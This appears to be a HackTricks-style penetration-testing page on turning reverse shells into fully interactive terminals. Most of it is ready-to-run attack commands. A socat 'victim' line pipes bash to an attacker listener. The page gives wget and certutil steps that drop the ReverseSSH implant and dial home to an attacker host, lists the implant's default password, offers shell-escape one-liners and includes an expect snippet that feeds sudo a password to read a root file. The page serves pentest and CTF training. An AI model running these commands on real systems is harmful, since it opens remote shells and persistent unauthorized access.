# Full TTYs

{{#include ../../banners/hacktricks-training.md}}

## Full TTY

`/etc/shells` lists valid login-shell pathnames and is consulted by some programs; it is not a universal prerequisite for allocating a PTY.<sup>[[3]](#references)[[4]](#references)</sup> If a program such as `pkexec` rejects `SHELL` with `The value for the SHELL variable was not found in the /etc/shells file`, ensure the exact shell path (for example, `/bin/bash`) appears in `/etc/shells`.<sup>[[10]](#references)</sup> The `CTRL+Z`/`fg` recovery sequence below uses Bash job control; if the current shell is not Bash, start Bash before using that sequence.<sup>[[7]](#references)</sup>

#### Python

Python's `pty.spawn` starts a program connected to the current process's standard input, output, and error streams, which gives Bash a pseudo-terminal in this session.<sup>[[4]](#references)</sup>

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> [!TIP]
> You can get the **number** of **rows** and **columns** by running **`stty -a`**; `-a` prints all current terminal settings. The command's output is terminal-specific, so use the values reported by the current session.<sup>[[11]](#references)</sup>

#### script

The `script` utility records a terminal session; here `/dev/null` discards the typescript, `-q` suppresses start and completion messages, and `-c` runs Bash instead of the default shell.<sup>[[5]](#references)</sup>

```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
```

After either PTY-spawn method, suspend the Netcat session and restore it with local raw mode, then set the remote terminal environment and dimensions:

```bash
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

#### socat

The listener uses the current terminal in raw mode with local echo disabled and accepts TCP connections on port 4444. The victim command allocates a pty, joins stderr, creates a session, forwards SIGINT, and applies sane terminal settings; add `ctty` if the child needs a controlling terminal.<sup>[[6]](#references)</sup>

```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap (old versions with `--interactive`): `!sh`

The Nmap escape is version-specific: Nmap removed its `--interactive` mode in later releases, so `!sh` applies only to old versions.<sup>[[13]](#references)</sup>

## ReverseSSH

A convenient way for **interactive shell access**, as well as **file transfers** and **port forwarding**, is dropping the statically-linked ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) onto the target.<sup>[[1]](#references)</sup>

Below is an example for `x86` with the project's published UPX-compressed binary. For other architectures or release artifacts, use the [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/) as navigation.<sup>[[1]](#references)</sup>

1. Prepare the local host to catch the incoming SSH connection. In listener mode, `-l` enables the listener and `-p 4444` selects the port on which it accepts the target's connection.<sup>[[1]](#references)</sup>

```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```

- (2a) Linux target. Transfer the same `upx_reverse-sshx86` artifact to `/dev/shm/reverse-ssh` and make it executable. The target's `-p 4444` selects the listener port above, and `kali@10.0.0.2` supplies the account and host used to dial home.<sup>[[1]](#references)</sup>

```bash
/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```

- (2b) Windows target. Full interactive PowerShell requires Windows 10 build 17763; see the [project README](https://github.com/Fahrj/reverse-ssh#features).<sup>[[1]](#references)</sup>

```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```

The Windows example uses `certutil` with `-f -urlcache`; Microsoft documents `-f` as forcing a URL fetch and notes that available parameters vary by version, so check `certutil -?` if this form is unavailable.<sup>[[12]](#references)</sup>

- After the reverse connection succeeds, ReverseSSH's reverse-mode listener binds port `8888` by default (or the value supplied with `-b`), and incoming connections accept any username with the default password `letmeinbrudipls`. The remote shell runs with the privileges of the account that launched `reverse-ssh(.exe)`.<sup>[[1]](#references)</sup>

```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```

## Penelope

[Penelope](https://github.com/brightio/penelope) automatically upgrades Unix-like reverse shells to PTY, resizes Unix-like terminals, and logs shell interactions; for Windows shells it provides readline but not real-time terminal resizing.<sup>[[2]](#references)</sup>

![Penelope reverse-shell handler interface](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

Run `penelope` to listen on `0.0.0.0:4444` by default; incoming Unix-like shells can then be auto-upgraded and logged.<sup>[[2]](#references)</sup>

![Penelope handling and upgrading an incoming shell](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

If for some reason you cannot obtain a full TTY you **still can interact with programs** that expect user input. In the following example, Expect spawns `sudo`, waits for its password prompt, sends the password, and returns control with `interact`; `sudo -S` reads its password from standard input. Use it only in an authorized lab and avoid placing real credentials in shell history or source files.<sup>[[8]](#references)[[9]](#references)</sup>

```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```

## References

- [1] [ReverseSSH - Statically-linked ssh server with reverse shell functionality for CTFs and such](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Shell handler that automates a few things to make life easier](https://github.com/brightio/penelope)
- [3] [shells(5) — Linux manual page](https://man7.org/linux/man-pages/man5/shells.5.html)
- [4] [Python `pty` — Python documentation](https://docs.python.org/3/library/pty.html)
- [5] [script(1) — Linux manual page](https://man7.org/linux/man-pages/man1/script.1.html)
- [6] [socat(1) — Linux manual page](https://man7.org/linux/man-pages/man1/socat.1.html)
- [7] [Bash Reference Manual — Job Control](https://www.gnu.org/s/bash/manual/bash.html)
- [8] [sudo(8) — Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [9] [expect(1) — Linux manual page](https://man7.org/linux/man-pages/man1/expect.1.html)
- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
- [11] [stty(1) — Linux manual page](https://man7.org/linux/man-pages/man1/stty.1.html)
- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Nmap Change Log](https://nmap.org/changelog.html)

{{#include ../../banners/hacktricks-training.md}}
